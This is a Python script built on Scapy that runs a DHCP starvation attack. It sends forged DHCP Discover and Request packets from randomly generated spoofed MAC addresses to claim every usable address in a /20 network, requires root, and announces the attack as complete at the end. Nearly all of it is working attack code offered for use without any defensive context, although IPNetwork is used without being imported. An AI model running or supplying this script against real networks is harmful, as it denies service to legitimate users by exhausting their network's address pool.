from scapy.all import *
import random
import time

# Configuration
dhcp_server_ip = "10.0.0.1"  # Change to your DHCP server
network = "10.0.0.1/20"
interface = "wlan0"  # Change to your interface

def random_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255)
    )

def dhcp_exhaust():
    ip_range = [str(x) for x in IPNetwork(network)]
    usable_ips = ip_range[1:-1]  # Skip network & broadcast
    
    print(f"[*] Starting DHCP exhaustion on {network}")
    print(f"[*] Targeting DHCP server: {dhcp_server_ip}")
    print(f"[*] Attempting to allocate {len(usable_ips)} IPs")

    for i in range(len(usable_ips)):
        spoofed_mac = random_mac()
        xid = random.randint(1, 0xFFFFFFFF)  # Random transaction ID

        # DHCP Discover
        discover = (
            Ether(src=spoofed_mac, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=[mac2str(spoofed_mac)], xid=xid) /
            DHCP(options=[("message-type", "discover"), "end"])
        )
        sendp(discover, iface=interface, verbose=0)

        # Wait for Offer (optional, can be skipped)
        time.sleep(0.1)

        # DHCP Request (to confirm lease)
        request = (
            Ether(src=spoofed_mac, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=[mac2str(spoofed_mac)], xid=xid) /
            DHCP(options=[("message-type", "request"), ("requested_addr", usable_ips[i]), "end"])
        )
        sendp(request, iface=interface, verbose=0)

        if (i + 1) % 10 == 0:
            print(f"[*] Sent {i + 1} DHCP requests")

        time.sleep(0.2)  # Avoid flooding

    print("[*] Attack completed. Check DHCP server leases.")

if __name__ == "__main__":
    import os
    if os.geteuid() != 0:
        print("[-] Run as root!")
        exit(1)
    dhcp_exhaust()
